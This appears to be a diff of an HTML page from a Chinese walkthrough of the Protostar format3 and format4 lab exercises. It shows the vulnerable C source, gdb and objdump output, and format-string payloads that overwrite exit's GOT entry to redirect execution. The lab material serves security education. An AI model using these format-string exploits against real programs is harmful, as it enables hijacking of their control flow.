+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;\xf4\x96\x04\x08&#39; + &#39;%16930112x&#39; + &#39;%12\$n&#39;)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./format3
 ...
-                                <span class="m">0</span>
-you have modified the target :<span class="o">)</span>
+<span class="w">                                </span><span class="m">0</span>
+you<span class="w"> </span>have<span class="w"> </span>modified<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>:<span class="o">)</span>
 </code></pre></div>
 <h2 id="format-4">Format 4<a class="headerlink" href="#format-4" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="n">target</span><span class="p">;</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="n">target</span><span class="p">;</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">hello</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;code execution redirected! you win</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">hello</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;code execution redirected! you win</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
 
-<span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
 
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
 
-<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">vuln</span><span class="p">();</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">vuln</span><span class="p">();</span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li>
 <p>获取 <code>hello</code> 函数的地址</p>
-<div class="highlight"><pre><span></span><code>$ objdump -t format4 <span class="p">|</span> grep hello
-080484b4 g     F .text  0000001e              hello
-$ gdb ./format4
-<span class="o">(</span>gdb<span class="o">)</span> x hello
-0x80484b4 &lt;hello&gt;:  0x83e58955
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>objdump<span class="w"> </span>-t<span class="w"> </span>format4<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>hello
+080484b4<span class="w"> </span>g<span class="w">     </span>F<span class="w"> </span>.text<span class="w">  </span>0000001e<span class="w">              </span>hello
+$<span class="w"> </span>gdb<span class="w"> </span>./format4
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x<span class="w"> </span>hello
+0x80484b4<span class="w"> </span>&lt;hello&gt;:<span class="w">  </span>0x83e58955
 </code></pre></div>
 </li>
 <li>
 <p>获取 GOT 表 <code>exit</code> 函数的条目地址</p>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel
-<span class="o">(</span>gdb<span class="o">)</span> disassemble vuln
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> vuln:
-0x080484d2 &lt;vuln+0&gt;:    push   ebp
-0x080484d3 &lt;vuln+1&gt;:    mov    ebp,esp
-0x080484d5 &lt;vuln+3&gt;:    sub    esp,0x218
-0x080484db &lt;vuln+9&gt;:    mov    eax,ds:0x8049730
-0x080484e0 &lt;vuln+14&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,eax
-0x080484e4 &lt;vuln+18&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x200
-0x080484ec &lt;vuln+26&gt;:   lea    eax,<span class="o">[</span>ebp-0x208<span class="o">]</span>
-0x080484f2 &lt;vuln+32&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x080484f5 &lt;vuln+35&gt;:   call   0x804839c &lt;fgets@plt&gt;
-0x080484fa &lt;vuln+40&gt;:   lea    eax,<span class="o">[</span>ebp-0x208<span class="o">]</span>
-0x08048500 &lt;vuln+46&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048503 &lt;vuln+49&gt;:   call   0x80483cc &lt;printf@plt&gt;
-0x08048508 &lt;vuln+54&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x1
-0x0804850f &lt;vuln+61&gt;:   call   0x80483ec &lt;exit@plt&gt;
-End of assembler dump.
-<span class="o">(</span>gdb<span class="o">)</span> disassemble 0x80483ec
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> exit@plt:
-0x080483ec &lt;exit@plt+0&gt;:    jmp    DWORD PTR ds:0x8049724
-0x080483f2 &lt;exit@plt+6&gt;:    push   0x30
-0x080483f7 &lt;exit@plt+11&gt;:   jmp    0x804837c
-End of assembler dump.
-<span class="o">(</span>gdb<span class="o">)</span> x 0x8049724
-0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;:   0x080483f2
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>disassembly-flavor<span class="w"> </span>intel
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>vuln
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>vuln:
+0x080484d2<span class="w"> </span>&lt;vuln+0&gt;:<span class="w">    </span>push<span class="w">   </span>ebp
+0x080484d3<span class="w"> </span>&lt;vuln+1&gt;:<span class="w">    </span>mov<span class="w">    </span>ebp,esp
+0x080484d5<span class="w"> </span>&lt;vuln+3&gt;:<span class="w">    </span>sub<span class="w">    </span>esp,0x218
+0x080484db<span class="w"> </span>&lt;vuln+9&gt;:<span class="w">    </span>mov<span class="w">    </span>eax,ds:0x8049730
+0x080484e0<span class="w"> </span>&lt;vuln+14&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x8<span class="o">]</span>,eax
+0x080484e4<span class="w"> </span>&lt;vuln+18&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,0x200
+0x080484ec<span class="w"> </span>&lt;vuln+26&gt;:<span class="w">   </span>lea<span class="w">    </span>eax,<span class="o">[</span>ebp-0x208<span class="o">]</span>
+0x080484f2<span class="w"> </span>&lt;vuln+32&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x080484f5<span class="w"> </span>&lt;vuln+35&gt;:<span class="w">   </span>call<span class="w">   </span>0x804839c<span class="w"> </span>&lt;fgets@plt&gt;
+0x080484fa<span class="w"> </span>&lt;vuln+40&gt;:<span class="w">   </span>lea<span class="w">    </span>eax,<span class="o">[</span>ebp-0x208<span class="o">]</span>
+0x08048500<span class="w"> </span>&lt;vuln+46&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048503<span class="w"> </span>&lt;vuln+49&gt;:<span class="w">   </span>call<span class="w">   </span>0x80483cc<span class="w"> </span>&lt;printf@plt&gt;
+0x08048508<span class="w"> </span>&lt;vuln+54&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x1
+0x0804850f<span class="w"> </span>&lt;vuln+61&gt;:<span class="w">   </span>call<span class="w">   </span>0x80483ec<span class="w"> </span>&lt;exit@plt&gt;
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>0x80483ec
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>exit@plt:
+0x080483ec<span class="w"> </span>&lt;exit@plt+0&gt;:<span class="w">    </span>jmp<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span>ds:0x8049724
+0x080483f2<span class="w"> </span>&lt;exit@plt+6&gt;:<span class="w">    </span>push<span class="w">   </span>0x30
+0x080483f7<span class="w"> </span>&lt;exit@plt+11&gt;:<span class="w">   </span>jmp<span class="w">    </span>0x804837c
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x<span class="w"> </span>0x8049724
+0x8049724<span class="w"> </span>&lt;_GLOBAL_OFFSET_TABLE_+36&gt;:<span class="w">   </span>0x080483f2
 </code></pre></div>
 </li>
 <li>
 <p>测试覆盖 <code>exit</code> 函数 GOT 表条目跳转 <code>hello</code> 函数的可行性</p>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x08048508
-Breakpoint <span class="m">1</span> at 0x8048508: file format4/format4.c, line <span class="m">22</span>.
-<span class="o">(</span>gdb<span class="o">)</span> r
-Starting program: /opt/protostar/bin/format4 
-Test input
-Test input
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*0x08048508
+Breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>at<span class="w"> </span>0x8048508:<span class="w"> </span>file<span class="w"> </span>format4/format4.c,<span class="w"> </span>line<span class="w"> </span><span class="m">22</span>.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/format4<span class="w"> </span>
+Test<span class="w"> </span>input
+Test<span class="w"> </span>input
 
-Breakpoint <span class="m">1</span>, vuln <span class="o">()</span> at format4/format4.c:22
-<span class="m">22</span>  format4/format4.c: No such file or directory.
-  <span class="k">in</span> format4/format4.c
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> <span class="o">{</span>int<span class="o">}</span><span class="nv">0x8049724</span><span class="o">=</span>0x80484b4
-<span class="o">(</span>gdb<span class="o">)</span> x 0x8049724
-0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;:   0x080484b4
-<span class="o">(</span>gdb<span class="o">)</span> c
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>vuln<span class="w"> </span><span class="o">()</span><span class="w"> </span>at<span class="w"> </span>format4/format4.c:22
+<span class="m">22</span><span class="w">  </span>format4/format4.c:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory.
+<span class="w">  </span><span class="k">in</span><span class="w"> </span>format4/format4.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="o">{</span>int<span class="o">}</span><span class="nv">0x8049724</span><span class="o">=</span>0x80484b4
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x<span class="w"> </span>0x8049724
+0x8049724<span class="w"> </span>&lt;_GLOBAL_OFFSET_TABLE_+36&gt;:<span class="w">   </span>0x080484b4
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
 Continuing.
-code execution redirected! you win
+code<span class="w"> </span>execution<span class="w"> </span>redirected!<span class="w"> </span>you<span class="w"> </span>win
 
-Program exited with code <span class="m">01</span>.
+Program<span class="w"> </span>exited<span class="w"> </span>with<span class="w"> </span>code<span class="w"> </span><span class="m">01</span>.
 </code></pre></div>
 </li>
 <li>
 <p>观察输入字符串在栈中的位置</p>
-<div class="highlight"><pre><span></span><code>$ python -c <span class="s2">&quot;print(&#39;%x &#39; * 20)&quot;</span> <span class="p">|</span> ./format4
-<span class="m">200</span> b7fd8420 bffff524 <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> b7ff000a <span class="m">0</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;%x &#39; * 20)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./format4
+<span class="m">200</span><span class="w"> </span>b7fd8420<span class="w"> </span>bffff524<span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span>b7ff000a<span class="w"> </span><span class="m">0</span>
 </code></pre></div>
 </li>
 <li>
@@ -3257,10 +3271,10 @@ Program exited with code <span class="m">01</span>.
 <span class="n">exploit</span> <span class="o">+=</span> <span class="s1">&#39;%5$n&#39;</span>
 <span class="nb">print</span> <span class="n">exploit</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ python /tmp/format.py <span class="p">|</span> ./format4
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>/tmp/format.py<span class="w"> </span><span class="p">|</span><span class="w"> </span>./format4
 ...
-     b7fd8420
-code execution redirected! you win
+<span class="w">     </span>b7fd8420
+code<span class="w"> </span>execution<span class="w"> </span>redirected!<span class="w"> </span>you<span class="w"> </span>win
 </code></pre></div>
 
   <hr>
